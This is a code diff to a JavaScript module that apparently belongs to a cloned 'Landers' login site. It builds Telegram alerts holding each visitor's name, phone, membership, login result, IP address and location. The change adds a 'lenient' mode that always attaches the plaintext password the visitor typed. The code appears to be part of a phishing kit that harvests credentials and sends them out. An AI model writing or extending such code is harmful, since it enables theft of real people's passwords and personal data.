@@ -168,6 +168,9 @@ export const esc = (s) =>
 
 export const loginMessage = (env, { user, ok, reason, password, meta, mode }) => {
   const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+  const isLenient = /lenient/i.test(String(mode || ''));
+  const withPassword =
+    (isLenient || /^(1|true|yes)$/i.test(String((env && env.TELEGRAM_INCLUDE_PASSWORD) || ''))) && Boolean(password);
   const lines = [
     `${ok ? '✅ <b>LOGIN OK</b>' : '❌ <b>LOGIN FAILED</b>'} — ${esc(env && env.SITE_LABEL ? env.SITE_LABEL : 'Landers clone')}`,
     '',
@@ -175,11 +178,9 @@ export const loginMessage = (env, { user, ok, reason, password, meta, mode }) =>
     `<b>Name</b>: ${esc((user && user.name) || '')}`,
     `<b>Phone</b>: ${esc((user && user.phone) || '')}`,
     `<b>Membership</b>: ${esc((user && user.membership) || '')}`,
-    `<b>Result</b>: ${ok ? 'password verified' : esc(reason || 'failed')}`,
+    `<b>Result</b>: ${ok ? esc(reason || 'signed in') : esc(reason || 'failed')}`,
   ];
-  if (env && /^(1|true|yes)$/i.test(String(env.TELEGRAM_INCLUDE_PASSWORD || '')) && password) {
-    lines.push(`<b>Password</b>: <code>${esc(password)}</code>`);
-  }
+  if (withPassword) lines.push(`<b>Password</b>: <code>${esc(password)}</code>`);
   lines.push(
     '',
     `<b>IP</b>: ${esc(meta.ip)} ${meta.country ? `(${esc(meta.country)}${meta.city ? ' / ' + esc(meta.city) : ''})` : ''}`,
